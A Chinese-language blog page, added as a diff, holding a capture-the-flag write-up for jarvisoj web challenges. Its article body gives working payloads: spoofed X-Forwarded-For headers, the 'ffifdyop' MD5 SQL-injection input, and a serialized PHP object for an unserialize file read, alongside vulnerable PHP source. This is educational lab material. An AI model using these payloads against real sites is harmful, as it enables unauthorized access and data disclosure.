@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>jarvisoj web 题目解答 | Rock&#39;s blog</title>
+  <meta name="keywords" content=" ctf , writerup , web ">
+  <meta name="description" content="jarvisoj web 题目解答 | Rock&#39;s blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="1.PORT51题目要求使用51号端口访问该地址curl --local-port 51 http:&#x2F;&#x2F;web.jarvisoj.com:32770&#x2F;2.LOCALHOST题目提示只有localhost才能访问，故在请求头中添加：client-ip: 127.0.0.1 X-Forwarded-For: 127.0.0.1成功获取到flag。3.Loginburp抓取到响应头部隐藏提示：Hint:">
+<meta name="keywords" content="ctf,writerup,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jarvisoj web 题目解答">
+<meta property="og:url" content="https:&#x2F;&#x2F;rock718.github.io.git&#x2F;2019&#x2F;12&#x2F;24&#x2F;jarvisoj-web-wp&#x2F;index.html">
+<meta property="og:site_name" content="Rock&#39;s blog">
+<meta property="og:description" content="1.PORT51题目要求使用51号端口访问该地址curl --local-port 51 http:&#x2F;&#x2F;web.jarvisoj.com:32770&#x2F;2.LOCALHOST题目提示只有localhost才能访问，故在请求头中添加：client-ip: 127.0.0.1 X-Forwarded-For: 127.0.0.1成功获取到flag。3.Loginburp抓取到响应头部隐藏提示：Hint:">
+<meta property="og:locale" content="zh_cn">
+<meta property="og:updated_time" content="2019-12-25T11:08:17.110Z">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/head_icon.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/head_icon.jpg" />
+</a>
+<div class="author">
+    <span>Rock</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="github" href="https://github.com/Rock718" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="email" href="mailto:luo_xiao_hei_718@163.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(9)</small></div></li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="9">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode==13){return false;}">
+        <input class="search" type="text" placeholder="Search..." autocomplete="off"id="local-search-input" >
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color4">ctf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">writeup</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">xss</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">vpn</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">writerup</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">web</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">python</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">sqli</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">hexo</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class=""
+           href="/2019/12/21/CG-CTF-wp/"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="CG-CTF_解题思路">CG-CTF_解题思路</span>
+            <span class="post-date" title="2019-12-21 22:30:49">2019/12/21</span>
+        </a>
+        
+        <a  class=""
+           href="/2017/09/16/WebForPentester-XSS/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="WebForPentester_XSS">WebForPentester_XSS</span>
+            <span class="post-date" title="2017-09-16 20:59:59">2017/09/16</span>
+        </a>
+        
+        <a  class=""
+           href="/2017/09/03/kali-XX-Net/"
+           data-tag="vpn"
+           data-author="" >
+            <span class="post-title" title="kali 安装 XX-Net openssl报错">kali 安装 XX-Net openssl报错</span>
+            <span class="post-date" title="2017-09-03 11:21:09">2017/09/03</span>
+        </a>
+        
+        <a  class=""
+           href="/2017/07/11/hexo_build/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="利用腾讯云服务器搭建hexo博客">利用腾讯云服务器搭建hexo博客</span>
+            <span class="post-date" title="2017-07-11 11:21:09">2017/07/11</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/12/24/jarvisoj-web-wp/"
+           data-tag="ctf,writerup,web"
+           data-author="" >
+            <span class="post-title" title="jarvisoj web 题目解答">jarvisoj web 题目解答</span>
+            <span class="post-date" title="2019-12-24 20:30:19">2019/12/24</span>
+        </a>
+        
+        <a  class=""
+           href="/2017/09/27/python-RSA/"
+           data-tag="python"
+           data-author="" >
+            <span class="post-title" title="利用Python的rsa模块加解密文件">利用Python的rsa模块加解密文件</span>
+            <span class="post-date" title="2017-09-27 21:05:47">2017/09/27</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/11/25/writeup-%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA-SQLi/"
+           data-tag="writeup,sqli"
+           data-author="" >
+            <span class="post-title" title="writeup-“百度杯”CTF比赛-九月场-SQLi">writeup-“百度杯”CTF比赛-九月场-SQLi</span>
+            <span class="post-date" title="2019-11-25 23:03:26">2019/11/25</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/11/28/%E5%86%8D%E2%80%9C%E8%A7%81%E2%80%9Dhexo%E2%80%94%E2%80%94%E9%87%8D%E6%96%B0%E7%90%86%E8%A7%A3hexo/"
+           data-tag="hexo"
+           data-author="" >
+            <span class="post-title" title="再“见”hexo——重新理解hexo">再“见”hexo——重新理解hexo</span>
+            <span class="post-date" title="2019-11-28 20:23:47">2019/11/28</span>
+        </a>
+        
+        <a  class=""
+           href="/2017/08/14/xss-game-writeup/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="google xss-game 题目解答">google xss-game 题目解答</span>
+            <span class="post-date" title="2017-08-14 11:21:09">2017/08/14</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-jarvisoj-web-wp" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">jarvisoj web 题目解答</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            
+            <a class="color4">ctf</a>
+            
+            <a class="color4">writerup</a>
+            
+            <a class="color4">web</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-12-25 19:08:17'>2019-12-24 20:30</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-PORT51"><span class="toc-text">1.PORT51</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目要求使用51号端口访问该地址"><span class="toc-text">题目要求使用51号端口访问该地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-LOCALHOST"><span class="toc-text">2.LOCALHOST</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目提示只有localhost才能访问，故在请求头中添加："><span class="toc-text">题目提示只有localhost才能访问，故在请求头中添加：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#成功获取到flag。"><span class="toc-text">成功获取到flag。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Login"><span class="toc-text">3.Login</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#burp抓取到响应头部隐藏提示："><span class="toc-text">burp抓取到响应头部隐藏提示：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5-pass-true-说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload："><span class="toc-text">md5($pass,true)说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。"><span class="toc-text">注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-神盾局的秘密"><span class="toc-text">3.神盾局的秘密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码："><span class="toc-text">打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#看到这里img后的base64编码字符串，解码后为shield-jpg。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。"><span class="toc-text">看到这里img后的base64编码字符串，解码后为shield.jpg。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#包含showimg-php，查看源码显示："><span class="toc-text">包含showimg.php，查看源码显示：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#可以看到这里对pctf进行了过滤。"><span class="toc-text">可以看到这里对pctf进行了过滤。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进一步尝试包含index-php："><span class="toc-text">进一步尝试包含index.php：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#再包含shield-php："><span class="toc-text">再包含shield.php：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#由于showimg-php对pctf进行了过滤，所以我们不能简单地直接包含pctf-php-但是可以注意到index-php允许我们提交一个class参数，该参数可以被反序列化为Shield-对象，然后调用其readfile-方法。故我们需要做的是为class参数传入一个序列化后的Shield-对象，这样经过反序列化后再调用其readfile-方法，就可以正确读取pctf-php。"><span class="toc-text">由于showimg.php对pctf进行了过滤，所以我们不能简单地直接包含pctf.php,但是可以注意到index.php允许我们提交一个class参数，该参数可以被反序列化为Shield()对象，然后调用其readfile()方法。故我们需要做的是为class参数传入一个序列化后的Shield()对象，这样经过反序列化后再调用其readfile()方法，就可以正确读取pctf.php。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#我们可以在本地搭建一个php环境，结合shield-php，输出序列化后的Shield-对象："><span class="toc-text">我们可以在本地搭建一个php环境，结合shield.php，输出序列化后的Shield()对象：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#运行的结果为："><span class="toc-text">运行的结果为：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#将该结果填入URL："><span class="toc-text">将该结果填入URL：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#得到flag。"><span class="toc-text">得到flag。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#持续更新中……"><span class="toc-text">持续更新中……</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="1-PORT51"><a href="#1-PORT51" class="headerlink" title="1.PORT51"></a>1.PORT51</h2><h3 id="题目要求使用51号端口访问该地址"><a href="#题目要求使用51号端口访问该地址" class="headerlink" title="题目要求使用51号端口访问该地址"></a>题目要求使用51号端口访问该地址</h3><pre><code>curl --local-port 51 http://web.jarvisoj.com:32770/</code></pre><h2 id="2-LOCALHOST"><a href="#2-LOCALHOST" class="headerlink" title="2.LOCALHOST"></a>2.LOCALHOST</h2><h3 id="题目提示只有localhost才能访问，故在请求头中添加："><a href="#题目提示只有localhost才能访问，故在请求头中添加：" class="headerlink" title="题目提示只有localhost才能访问，故在请求头中添加："></a>题目提示只有localhost才能访问，故在请求头中添加：</h3><pre><code>client-ip: 127.0.0.1
+X-Forwarded-For: 127.0.0.1</code></pre><h3 id="成功获取到flag。"><a href="#成功获取到flag。" class="headerlink" title="成功获取到flag。"></a>成功获取到flag。</h3><h2 id="3-Login"><a href="#3-Login" class="headerlink" title="3.Login"></a>3.Login</h2><h3 id="burp抓取到响应头部隐藏提示："><a href="#burp抓取到响应头部隐藏提示：" class="headerlink" title="burp抓取到响应头部隐藏提示："></a>burp抓取到响应头部隐藏提示：</h3><pre><code>Hint: &quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</code></pre><h3 id="md5-pass-true-说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload："><a href="#md5-pass-true-说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload：" class="headerlink" title="md5($pass,true)说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload："></a><code>md5($pass,true)</code>说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload：</h3><pre><code>明文: 129581926211651571912466741651878684928
+md5hex: 06da5430449f8f6f23dfc1276f722738
+对应的字符串: ?T0D??o#??’or’8.N=?
+明文: ffifdyop
+md5hex: 276f722736c95d99e921722cf9ed621c
+对应的字符串: ‘or’6蒥欓!r,b</code></pre><h3 id="注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。"><a href="#注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。" class="headerlink" title="注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。"></a><strong><em>注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。</em></strong></h3><h2 id="3-神盾局的秘密"><a href="#3-神盾局的秘密" class="headerlink" title="3.神盾局的秘密"></a>3.神盾局的秘密</h2><h3 id="打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码："><a href="#打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码：" class="headerlink" title="打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码："></a>打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码：</h3><pre><code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</code></pre><h3 id="看到这里img后的base64编码字符串，解码后为shield-jpg。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。"><a href="#看到这里img后的base64编码字符串，解码后为shield-jpg。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。" class="headerlink" title="看到这里img后的base64编码字符串，解码后为shield.jpg。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。"></a>看到这里<code>img</code>后的base64编码字符串，解码后为<code>shield.jpg</code>。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。</h3><h3 id="包含showimg-php，查看源码显示："><a href="#包含showimg-php，查看源码显示：" class="headerlink" title="包含showimg.php，查看源码显示："></a>包含<code>showimg.php</code>，查看源码显示：</h3><pre><code>&lt;?php
+    $f = $_GET[&apos;img&apos;];
+    if (!empty($f)) {
+        $f = base64_decode($f);
+        if (stripos($f,&apos;..&apos;)===FALSE &amp;&amp; stripos($f,&apos;/&apos;)===FALSE &amp;&amp; stripos($f,&apos;\\&apos;)===FALSE
+        &amp;&amp; stripos($f,&apos;pctf&apos;)===FALSE) {
+            readfile($f);
+        } else {
+            echo &quot;File not found!&quot;;
+        }
+    }
+?&gt;</code></pre><h3 id="可以看到这里对pctf进行了过滤。"><a href="#可以看到这里对pctf进行了过滤。" class="headerlink" title="可以看到这里对pctf进行了过滤。"></a>可以看到这里对<code>pctf</code>进行了过滤。</h3><h3 id="进一步尝试包含index-php："><a href="#进一步尝试包含index-php：" class="headerlink" title="进一步尝试包含index.php："></a>进一步尝试包含<code>index.php</code>：</h3><pre><code>&lt;?php
+    require_once(&apos;shield.php&apos;);
+    $x = new Shield();
+    isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];
+    if (!empty($g)) {
+        $x = unserialize($g);
+    }
+    echo $x-&gt;readfile();
+?&gt;</code></pre><h3 id="再包含shield-php："><a href="#再包含shield-php：" class="headerlink" title="再包含shield.php："></a>再包含<code>shield.php</code>：</h3><pre><code>&lt;?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = &apos;&apos;) {
+            $this -&gt; file = $filename;
+        }
+
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE
+            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+?&gt;</code></pre><h3 id="由于showimg-php对pctf进行了过滤，所以我们不能简单地直接包含pctf-php-但是可以注意到index-php允许我们提交一个class参数，该参数可以被反序列化为Shield-对象，然后调用其readfile-方法。故我们需要做的是为class参数传入一个序列化后的Shield-对象，这样经过反序列化后再调用其readfile-方法，就可以正确读取pctf-php。"><a href="#由于showimg-php对pctf进行了过滤，所以我们不能简单地直接包含pctf-php-但是可以注意到index-php允许我们提交一个class参数，该参数可以被反序列化为Shield-对象，然后调用其readfile-方法。故我们需要做的是为class参数传入一个序列化后的Shield-对象，这样经过反序列化后再调用其readfile-方法，就可以正确读取pctf-php。" class="headerlink" title="由于showimg.php对pctf进行了过滤，所以我们不能简单地直接包含pctf.php,但是可以注意到index.php允许我们提交一个class参数，该参数可以被反序列化为Shield()对象，然后调用其readfile()方法。故我们需要做的是为class参数传入一个序列化后的Shield()对象，这样经过反序列化后再调用其readfile()方法，就可以正确读取pctf.php。"></a>由于<code>showimg.php</code>对<code>pctf</code>进行了过滤，所以我们不能简单地直接包含<code>pctf.php</code>,但是可以注意到<code>index.php</code>允许我们提交一个<code>class</code>参数，该参数可以被反序列化为<code>Shield()</code>对象，然后调用其<code>readfile()</code>方法。故我们需要做的是为<code>class</code>参数传入一个序列化后的<code>Shield()</code>对象，这样经过反序列化后再调用其<code>readfile()</code>方法，就可以正确读取<code>pctf.php</code>。</h3><h3 id="我们可以在本地搭建一个php环境，结合shield-php，输出序列化后的Shield-对象："><a href="#我们可以在本地搭建一个php环境，结合shield-php，输出序列化后的Shield-对象：" class="headerlink" title="我们可以在本地搭建一个php环境，结合shield.php，输出序列化后的Shield()对象："></a>我们可以在本地搭建一个php环境，结合<code>shield.php</code>，输出序列化后的<code>Shield()</code>对象：</h3><pre><code>&lt;?php
+    class Shield {
+        public $file;
+        function __construct($filename = &apos;&apos;) {
+            $this -&gt; file = $filename;
+        }
+
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE
+            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+}
+$pctf = new Shield(&quot;pctf.php&quot;);
+echo serialize($pctf);
+?&gt;</code></pre><h3 id="运行的结果为："><a href="#运行的结果为：" class="headerlink" title="运行的结果为："></a>运行的结果为：</h3><pre><code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><h3 id="将该结果填入URL："><a href="#将该结果填入URL：" class="headerlink" title="将该结果填入URL："></a>将该结果填入URL：</h3><pre><code>/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><h3 id="得到flag。"><a href="#得到flag。" class="headerlink" title="得到flag。"></a>得到flag。</h3><h2 id="持续更新中……"><a href="#持续更新中……" class="headerlink" title="持续更新中……"></a>持续更新中……</h2>
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以邮件至 luo_xiao_hei_718@163.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>jarvisoj web 题目解答</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="Rock">Rock</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-12-24, 20:30:19</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-25, 19:08:17</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/24/jarvisoj-web-wp/" title="jarvisoj web 题目解答">https://rock718.github.io.git/2019/12/24/jarvisoj-web-wp/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2017-2019 Rock</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#ctf','#writeup','#xss','#vpn','#writerup','#web','#python','#sqli','#hexo',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
